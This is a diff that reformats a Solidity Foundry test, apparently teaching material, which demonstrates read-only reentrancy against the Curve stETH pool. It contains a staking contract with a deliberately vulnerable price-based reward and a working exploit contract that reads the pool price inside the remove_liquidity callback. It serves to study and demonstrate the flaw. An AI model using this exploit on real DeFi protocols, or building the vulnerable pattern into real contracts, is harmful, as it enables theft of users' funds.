@@ -8,100 +8,118 @@ import "./interface.sol";
 // forge test --contracts ./src/test/ReadOnlyReentrancy.sol -vv
 
 interface ICurve {
-  function get_virtual_price() external view returns (uint);
+    function get_virtual_price() external view returns (uint256);
 
-  function add_liquidity(uint[2] calldata amounts, uint min_mint_amount)
-    external
-    payable
-    returns (uint);
+    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount)
+        external
+        payable
+        returns (uint256);
 
-  function remove_liquidity(uint lp, uint[2] calldata min_amounts)
-    external
-    returns (uint[2] memory);
+    function remove_liquidity(uint256 lp, uint256[2] calldata min_amounts)
+        external
+        returns (uint256[2] memory);
 
-  function remove_liquidity_one_coin(
-    uint lp,
-    int128 i,
-    uint min_amount
-  ) external returns (uint);
+    function remove_liquidity_one_coin(
+        uint256 lp,
+        int128 i,
+        uint256 min_amount
+    ) external returns (uint256);
 }
 
 address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
 address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token
 
-// VulnContract 
-// users stake LP_TOKEN 
+// VulnContract
+// users stake LP_TOKEN
 // getReward rewards the users based on the current price of the pool LP token
 contract VulnContract {
-  IERC20 public constant token = IERC20(LP_TOKEN);
-  ICurve private constant pool = ICurve(STETH_POOL);
+    IERC20 public constant token = IERC20(LP_TOKEN);
+    ICurve private constant pool = ICurve(STETH_POOL);
 
-  mapping(address => uint) public balanceOf;
+    mapping(address => uint256) public balanceOf;
 
-  function stake(uint amount) external {
-    token.transferFrom(msg.sender, address(this), amount);
-    balanceOf[msg.sender] += amount;
-  }
+    function stake(uint256 amount) external {
+        token.transferFrom(msg.sender, address(this), amount);
+        balanceOf[msg.sender] += amount;
+    }
 
-  function unstake(uint amount) external {
-    balanceOf[msg.sender] -= amount;
-    token.transfer(msg.sender, amount);
-  }
+    function unstake(uint256 amount) external {
+        balanceOf[msg.sender] -= amount;
+        token.transfer(msg.sender, amount);
+    }
 
-  function getReward() external returns (uint) {
-    //rewarding tokens based on the current virtual price of the pool LP token
-    uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) / 1 ether;
-    // Omitting code to transfer reward tokens
-    return reward;
-  }
+    function getReward() external returns (uint256) {
+        //rewarding tokens based on the current virtual price of the pool LP token
+        uint256 reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
+            1 ether;
+        // Omitting code to transfer reward tokens
+        return reward;
+    }
 }
 
 contract ExploitContract {
-  ICurve private constant pool = ICurve(STETH_POOL);
-  IERC20 public constant lpToken = IERC20(LP_TOKEN);
-  VulnContract private immutable target;
+    ICurve private constant pool = ICurve(STETH_POOL);
+    IERC20 public constant lpToken = IERC20(LP_TOKEN);
+    VulnContract private immutable target;
 
-  constructor(address _target) {
-    target = VulnContract(_target);
-  }
+    constructor(address _target) {
+        target = VulnContract(_target);
+    }
 
-  receive() external payable { // receive() is called when the remove_liquidity is called
-    console.log("--------------------------------------------------------------------");
-    console.log("LP token price during remove_liquidity()", pool.get_virtual_price());
-    // Attack - Log reward amount
-    uint reward = target.getReward();
-    console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
-  }
+    receive() external payable {
+        // receive() is called when the remove_liquidity is called
+        console.log(
+            "--------------------------------------------------------------------"
+        );
+        console.log(
+            "LP token price during remove_liquidity()",
+            pool.get_virtual_price()
+        );
+        // Attack - Log reward amount
+        uint256 reward = target.getReward();
+        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
+    }
 
-  // Stake LP into VulnContract
-  function stakeTokens() external payable {
-    uint[2] memory amounts = [msg.value, 0];
-    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
-    console.log("LP token price after staking into VulnContract", pool.get_virtual_price());
+    // Stake LP into VulnContract
+    function stakeTokens() external payable {
+        uint256[2] memory amounts = [msg.value, 0];
+        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        console.log(
+            "LP token price after staking into VulnContract",
+            pool.get_virtual_price()
+        );
 
-    lpToken.approve(address(target), lp);
-    target.stake(lp);
-  }
+        lpToken.approve(address(target), lp);
+        target.stake(lp);
+    }
 
-  // Perform Read-Only Reentrancy
-  function performReadOnlyReentrnacy() external payable {
-    // Add liquidity to Curve
-    uint[2] memory amounts = [msg.value, 0];
-    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
-    // Log get_virtual_price
-    console.log("LP token price before remove_liquidity()", pool.get_virtual_price());
-    // Remove liquidity from Curve
-    // remove_liquidity() invokes the recieve() callback 
-    uint[2] memory min_amounts = [uint(0), uint(0)];
-    pool.remove_liquidity(lp, min_amounts);
-    // Log get_virtual_price
-    console.log("--------------------------------------------------------------------");
-    console.log("LP token price after remove_liquidity()", pool.get_virtual_price());
+    // Perform Read-Only Reentrancy
+    function performReadOnlyReentrnacy() external payable {
+        // Add liquidity to Curve
+        uint256[2] memory amounts = [msg.value, 0];
+        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        // Log get_virtual_price
+        console.log(
+            "LP token price before remove_liquidity()",
+            pool.get_virtual_price()
+        );
+        // Remove liquidity from Curve
+        // remove_liquidity() invokes the recieve() callback
+        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
+        pool.remove_liquidity(lp, min_amounts);
+        // Log get_virtual_price
+        console.log(
+            "--------------------------------------------------------------------"
+        );
+        console.log(
+            "LP token price after remove_liquidity()",
+            pool.get_virtual_price()
+        );
 
-    // Attack - Log reward amount
-    uint reward = target.getReward();
-    console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
-  }
+        // Attack - Log reward amount
+        uint256 reward = target.getReward();
+        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
+    }
 }
 
 contract ExploitTest is Test {
